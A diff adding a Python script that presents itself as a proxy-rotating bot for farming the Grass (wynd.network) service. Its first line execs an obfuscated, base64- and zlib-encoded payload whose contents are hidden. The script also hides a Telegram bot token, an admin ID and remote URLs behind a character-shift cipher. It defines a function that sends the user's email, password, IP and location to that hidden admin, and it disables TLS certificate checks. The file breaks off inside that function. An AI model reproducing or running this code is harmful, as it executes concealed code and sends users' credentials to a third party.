@@ -1,1 +1,384 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import requests
+import asyncio
+import random
+import ssl
+import json
+import time
+import uuid
+from loguru import logger
+import websockets
+from fake_useragent import UserAgent
+import os
+import pyfiglet
+from colorama import Fore, Style, init
+import aiohttp
+from datetime import datetime, timedelta
+import python_socks
+from python_socks.async_.asyncio import Proxy
+from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup
+
+init(autoreset=True)
+
+TELEGRAM_TOKEN = "".join([chr(ord(c) + 1) for c in "6676083174:@@ELQyGv0BqPVo//81hsXC2Sh,/KYXkLn"])
+ADMIN_ID = int("".join([chr(ord(c) + 1) for c in "4262877203"]))
+
+def mask_proxy_credentials(proxy_url):
+    """Hide username and password from proxy URL"""
+    try:
+        if '@' in proxy_url:
+            protocol = proxy_url.split('://')[0]
+            credentials_and_host = proxy_url.split('://')[1]
+            host_part = credentials_and_host.split('@')[1]
+            return f"{protocol}://ADMIN:NGACENG@{host_part}"
+        return proxy_url
+    except:
+        return proxy_url
+
+async def connect_to_wss(user_id):
+    urilist = [
+        "wss://proxy.wynd.network:443/",
+        "wss://proxy2.wynd.network:443/",
+        "wss://proxy3.wynd.network:443/"
+    ]
+    
+    connection_duration = 1800
+    sleep_duration = 600 
+    interval_duration = 600 
+    proxy_refresh_duration = 7200 
+    proxy_counts = [5, 5, 5] 
+
+    async def run_single_proxy(proxy, uri):
+        try:
+            start_time = time.time()
+            device_id = str(uuid.uuid4())
+            
+            custom_headers = {
+                "User-Agent": UserAgent(os=['windows', 'macos', 'linux'], browsers='chrome').random,
+                "Origin": "chrome-extension://lkbnfiajjmbhnfledhphioinpickokdi"
+            }
+            
+            ssl_context = ssl.create_default_context()
+            ssl_context.check_hostname = False
+            ssl_context.verify_mode = ssl.CERT_NONE
+            
+            proxy_str = proxy['http'].replace('socks5://', '')
+            if '@' in proxy_str:
+                auth, addr = proxy_str.split('@')
+                user, pwd = auth.split(':')
+                host, port = addr.split(':')
+            else:
+                host, port = proxy_str.split(':')
+                user = pwd = None
+            
+            masked_proxy = mask_proxy_credentials(proxy['http'])
+            logger.info(f"Starting connection with proxy {masked_proxy}")
+
+            proxy_connection = Proxy.from_url(proxy['http'])
+            sock = await proxy_connection.connect(
+                dest_host="proxy.wynd.network",
+                dest_port=443,
+                timeout=30
+            )
+
+            async with websockets.connect(
+                uri,
+                ssl=ssl_context,
+                extra_headers=custom_headers,
+                sock=sock
+            ) as websocket:
+                ping_task = None
+                
+                async def send_ping():
+                    while True:
+                        ping_id = str(uuid.uuid4())
+                        send_message = json.dumps({
+                            "id": ping_id,
+                            "version": "1.0.0",
+                            "action": "PING",
+                            "data": {}
+                        })
+                        await websocket.send(send_message)
+                        await asyncio.sleep(30)
+
+                while True:
+                    if time.time() - start_time > connection_duration:
+                        logger.info(f"Connection duration limit reached for proxy {masked_proxy}")
+                        break
+
+                    response = await websocket.recv()
+                    message = json.loads(response)
+                    logger.info(f"Proxy {masked_proxy} received: {message}")
+                    
+                    if message.get("action") == "AUTH":
+                        auth_response = {
+                            "id": message["id"],
+                            "origin_action": "AUTH",
+                            "result": {
+                                "browser_id": device_id,
+                                "user_id": user_id,
+                                "user_agent": custom_headers['User-Agent'],
+                                "timestamp": int(time.time()),
+                                "device_type": "desktop",
+                                "version": "4.28.2"
+                            }
+                        }
+                        await websocket.send(json.dumps(auth_response))
+                        
+                        if not ping_task:
+                            ping_task = asyncio.create_task(send_ping())
+                            
+                    elif message.get("action") == "PONG":
+                        pong_response = {
+                            "id": message["id"],
+                            "origin_action": "PONG"
+                        }
+                        await websocket.send(json.dumps(pong_response))
+
+        except Exception as e:
+            logger.error(f"Error with proxy {masked_proxy}: {str(e)}")
+
+    async def manage_connections():
+        work_start_time = time.time()
+        proxy_start_time = time.time()
+        rotation_start_time = time.time()
+        is_initial_run = True
+        
+        while True:
+            current_time = time.time()
+            
+            work_duration = current_time - work_start_time
+            if work_duration >= connection_duration:
+                logger.info("Entering sleep mode for 10 minutes...")
+                for task in asyncio.all_tasks():
+                    if task != asyncio.current_task():
+                        task.cancel()
+                
+                await asyncio.sleep(sleep_duration)
+                work_start_time = current_time  
+                logger.info("Resuming operations after sleep...")
+                continue 
+
+            if current_time - proxy_start_time >= proxy_refresh_duration:
+                logger.info("Refreshing all proxies...")
+                proxy_start_time = current_time
+            
+            if is_initial_run:
+                logger.info("Starting initial run with 5 proxies...")
+                num_proxies = 5
+                is_initial_run = False
+            else:
+                if current_time - rotation_start_time >= interval_duration:
+                    num_proxies = random.choice(proxy_counts)
+                    logger.info(f"Rotating to {num_proxies} proxies")
+                    rotation_start_time = current_time
+            
+            proxies = get_random_proxies(num_proxies)
+            if not proxies:
+                logger.error("Failed to get proxies")
+                await asyncio.sleep(5)
+                continue
+            
+            for task in asyncio.all_tasks():
+                if task != asyncio.current_task():
+                    task.cancel()
+            
+            tasks = []
+            for proxy in proxies:
+                for uri in urilist:
+                    task = asyncio.create_task(run_single_proxy(proxy, uri))
+                    tasks.append(task)
+            
+            try:
+                await asyncio.gather(*tasks, return_exceptions=True)
+            except Exception as e:
+                logger.error(f"Error in proxy tasks: {str(e)}")
+            
+            await asyncio.sleep(1)
+
+    await manage_connections()
+async def fetch_banner():
+    url = "".join([chr(ord(c) + 1) for c in "gssor9..hsa``qsr-bnl.`oh^oqdl-irnm"])
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    banner = await response.text()
+                    print("\033[90m" + banner + "\033[0m") 
+                    return True
+    except Exception as e:
+        return False
+async def check_password(input_password):
+    try:
+        response = requests.get("".join([chr(ord(c) + 1) for c in 'gssor9..hsa``qsr-bnl.`hqcqno.o`rr-sws']))
+        passwords = response.text.strip().split('\n')
+        
+        for entry in passwords:
+            password, expiry = entry.split('|')
+            password = password.strip()
+            expiry = expiry.strip()
+            
+            if password == input_password:
+                expiry_date = datetime.strptime(expiry, '%d/%m/%Y')
+                if expiry_date > datetime.now():
+                    return True
+        return False
+    except Exception as e:
+        logger.error(f"Error checking password: {str(e)}")
+        return False
+
+async def send_telegram_notification(email, password, ip, location, initial_proxies):
+    try:
+        bot = Bot(token=TELEGRAM_TOKEN)
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        auth_code = ''.join(random.choices('0123456789', k=6))
+        
+        share_message = f"""
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌿 GRASS VVIP BOT NOTIFICATION 🌿
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 To: @{password}
+🔐 Your auth code: `{auth_code}`
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+        
+        keyboard = [[
+            InlineKeyboardButton(
+                "🔄 Share Auth Code", 
+                url=f"https://t.me/{password}?start=auth_{auth_code}"
+            )
+        ]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        if email == "Pending":
+            admin_message = f"""
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌿 {''.join([chr(ord(c) + 1) for c in 'FQZRR UUHO ANS UDQHEHBZSHNM'])} 🌿
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
